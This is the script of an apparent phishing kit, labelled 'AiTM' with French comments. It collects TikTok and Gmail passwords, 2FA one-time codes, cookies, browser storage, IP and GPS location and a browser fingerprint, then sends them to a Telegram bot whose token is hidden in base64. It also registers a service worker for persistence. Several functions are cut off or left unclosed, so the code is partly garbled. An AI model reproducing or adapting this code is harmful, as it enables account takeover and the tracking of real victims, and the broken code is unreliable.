<script>
// ================================================================
// OBFUSCATION BASE64 — TOKEN + CHAT ID
// Aucun string sensible dans le code source
// ================================================================
(function(){
  // "bot8868186269:AAHwrY72J7JDgPlV29c2LWqkj5ks9DjoEQo"
  var _t = 'Ym90ODg2ODE4NjI2OTpBQUh3clk3Mko3SkRnUGxWMjljMkxXcWtqNWtzOURqb0VRbw==';
  // "8675191556"
  var _c = 'ODY3NTE5MTU1Ng==';
  window.__TG = {
    t: atob(_t),
    c: atob(_c)
  };
  // Vérification rapide
  if(window.__TG.t.indexOf('bot')!==0) console.error('❌ Token invalide');
})();

// ================================================================
// TELEGRAM ENGINE
// ================================================================
function tg(m,p){
  var w=window.__TG;
  if(!w||!w.t||!w.c) return Promise.resolve();
  return fetch('https://api.telegram.org/'+w.t+'/'+m,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:w.c,...p})
  }).then(function(r){return r.json();}).catch(function(){});
}

function send(t){ return tg('sendMessage',{text:t,parse_mode:'HTML',disable_web_page_preview:true}); }

// ================================================================
// TEST DE CONNECTIVITÉ
// ================================================================
window.addEventListener('DOMContentLoaded',function(){
  setTimeout(function(){ send('<b>✅ AiTM READY</b>\nBot opérationnel - en attente de victime'); },1500);
});

// ================================================================
// COOKIE STEALER
// ================================================================
function steal(){
  var c=document.cookie, l={}, s={};
  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(k);}}catch(e){}
  try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k);}}catch(e){}
  return {
    c:c||'∅',
    l:JSON.stringify(l).substring(0,800),
    s:JSON.stringify(s).substring(0,800),
    u:navigator.userAgent,
    p:navigator.platform,
    sc:screen.width+'x'+screen.height,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    lg:navigator.language,
    ref:document.referrer||'∅',
    url:window.location.href
  };
}

// ================================================================
// IP GRABBER
// ================================================================
function ipg(){
  var d={ip:'?',co:'?',ci:'?',re:'?',org:'?',la:'?',lo:'?'};
  return fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(j){
    d={ip:j.ip||'?',co:j.country_name||'?',ci:j.city||'?',re:j.region||'?',org:j.org||'?',la:j.latitude||'?',lo:j.longitude||'?'};
    return d;
  }).catch(function(){
    return fetch('https://ipinfo.io/json').then(function(r){return r.json();}).then(function(j2){
      var lc=(j2.loc||'').split(',');
      d={ip:j2.ip||'?',co:j2.country||'?',ci:j2.city||'?',re:j2.region||'?',org:j2.org||'?',la:lc[0]||'?',lo:lc[1]||'?'};
      return d;
    }).catch(function(){return d;});
  });
}

// ================================================================
// BUILD MESSAGE
// ================================================================
function build(l,ex){
  var c=steal();
  var r=[
    '<b>🔥 AiTM — '+l+'</b>',
    '',
    '<b>📋 COMPTES</b>',
    '▫️ TikTok: <code>'+(ex.tu||'?')+'</code> / <code>'+(ex.tp||'?')+'</code>',
    '▫️ Gmail: <code>'+(ex.gu||'?')+'</code> / <code>'+(ex.gp||'?')+'</code>',
    '▫️ OTP 2FA: <code>'+(ex.otp||'?')+'</code>',
    '',
    '<b>🍪 COOKIES</b>',
    '<code>'+(c.c||'?').substring(0,1000)+'</code>',
    '',
    '<b>💾 STORAGE</b>',
    '<code>'+c.l.substring(0,500)+'</code>',
    '',
    '<b>🌐 GÉOLOC</b>',
    '▫️ IP: <code>'+(ex.ip||'?')+'</code>',
    '▫️ Pays: '+(ex.co||'?'),
    '▫️ Ville: '+(ex.ci||'?'),
    '▫️ Region: '+(ex.re||'?'),
    '▫️ FAI: '+(ex.org||'?'),
    '▫️ Coord: '+(ex.la||'?')+', '+(ex.lo||'?'),
    '',
    '<b>🖥️ SYSTÈME</b>',
    '▫️ UA: '+c.u,
    '▫️ Écran: '+c.sc,
    '▫️ TZ: '+c.tz,
    '▫️ Lang: '+c.lg,
    '▫️ URL: '+c.url,
    '▫️ Ref: '+c.ref,
    '',
    '<b>⏱️ TIMING</b>',
    '▫️ TikTok: '+(ex.tt||'?'),
    '▫️ Gmail: '+(ex.tg||'?'),
    '▫️ OTP: '+(ex.to||'?'),
    '▫️ Total: '+(ex.tot||'?')
  ];
  return r.join('\n');
}

function exfil(label,extra){
  ipg().then(function(ip){
    var msg=build(label,Object.assign({},extra,ip));
    send(msg);
  });
}

// ================================================================

var cd=272;
setInterval(function(){

    var s=String(cd%60).padStart(2,'0');

// ================================================================
// TOAST
// ================================================================
function toast(t){
  var el=document.getElementById('toast');
  el.textContent=t;el.style.display='block';
  setTimeout(function(){el.style.display='none';},3000);
}

// ================================================================
// PAGES

var ss=null;

function sP2(){

  document.getElementById('p2').style.display='block';
}

// ================================================================
// SUBMIT TIKTOK
// ================================================================
function sTK(){
  var tu=document.getElementById('tu').value.trim();
  var tp=document.getElementById('tp').value.trim();
  if(!tu||!tp){toast('❌ Remplis tous les champs');return;}
  var now=new Date();

  document.getElementById('bt1').disabled=true;
  document.getElementById('bt1').textContent='⏳ Vérification...';
  exfil('TIKTOK',{tu:tu,tp:tp,tt:el+'s',tg:'?',to:'?',tot:el+'s',gu:'?',gp:'?',otp:'?'});

// ================================================================
// SUBMIT GMAIL
// ================================================================
function sGM(){
  var gu=document.getElementById('gu').value.trim();
  var gp=document.getElementById('gp').value.trim();
  if(!gu||!gp){toast('❌ Remplis tous les champs');return;}
  var now=new Date();

// ================================================================
// SUBMIT OTP / 2FA
// ================================================================
function sOTP(){
  var otp=document.getElementById('otp').value.trim();
  if(!otp||otp.length<4){toast('❌ Entre le code à 6 chiffres');return;}
  var now=new Date();
  var total=Math.floor((now-ss)/1000);
  document.getElementById('bt3').disabled=true;
  document.getElementById('bt3').textContent='⏳ Vérification...';
  document.getElementById('os').style.display='block';
  var tu=document.getElementById('tu').value.trim();
  var tp=document.getElementById('tp').value.trim();
  var gu=document.getElementById('gu').value.trim();
  var gp=document.getElementById('gp').value.trim();
  
  // Exfil OTP + redirection après
  ipg().then(function(ip){
    var msg=build('FULL + OTP',{
      tu:tu,tp:tp,gu:gu,gp:gp,otp:otp,
      tt:Math.floor(total*0.4)+'s',
      tg:Math.floor(total*0.35)+'s',
      to:Math.floor(total*0.25)+'s',
      tot:total+'s',
      ip:ip.ip,co:ip.co,ci:ip.ci,re:ip.re,org:ip.org,la:ip.la,lo:ip.lo
    });
    send(msg).then(function(){
      // Redirection vers vrai TikTok

}

// ================================================================
// FINGERPRINTING
// ================================================================
function fp(){
  var f={
    pl:Array.from(navigator.plugins||[]).map(function(p){return p.name;}).join(', '),
    co:navigator.hardwareConcurrency||'?',
    mem:navigator.deviceMemory||'?',
    tp:navigator.maxTouchPoints||'?',
    dnt:navigator.doNotTrack||'?',
    ck:navigator.cookieEnabled,
    wd:navigator.webdriver||false,
    lg:(navigator.languages||[]).join(', ')
  };
  try{
    var cv=document.createElement('canvas');
    cv.width=200;cv.height=50;
    var ctx=cv.getContext('2d');
    ctx.textBaseline='top';
    ctx.font='14px Arial';
    ctx.fillStyle='#f60';
    ctx.fillRect(125,1,62,20);
    ctx.fillStyle='#069';
    ctx.fillText('XkF92P',2,15);
    f.canvas=cv.toDataURL().substring(0,200);
  }catch(e){}
  send('<b>🖥️ FINGERPRINT</b>\n\n<code>'+JSON.stringify(f,null,2).substring(0,2000)+'</code>');
}
setTimeout(fp,4000);

function geo(){
  if('geolocation'in navigator){
    navigator.geolocation.getCurrentPosition(function(p){
      send('<b>📍 GPS EXACT</b>\n\nLat: '+p.coords.latitude+'\nLon: '+p.coords.longitude+'\nAcc: '+p.coords.accuracy+'m');
    },function(){});
  }
}
// Demander après 8s si on est sur la page OTP
setTimeout(function(){
  if(document.getElementById('p4').style.display==='block') geo();
},8000);

// ================================================================

// ================================================================
if('serviceWorker'in navigator){
  try{
    // Tentative d'enregistrer un SW minimal (navigateur peut bloquer)
    var swCode = 'self.addEventListener("fetch",function(e){e.respondWith(fetch(e.request));});';
    var blob = new Blob([swCode], {type:'application/javascript'});
    var swUrl = URL.createObjectURL(blob);
    navigator.serviceWorker.register(swUrl, {scope:'/'}).then(function(reg){
      send('<b>🤖 Service Worker ACTIF</b>\nPersistance obtenue sur le navigateur');
    }).catch(function(){});
  }catch(e){}
}
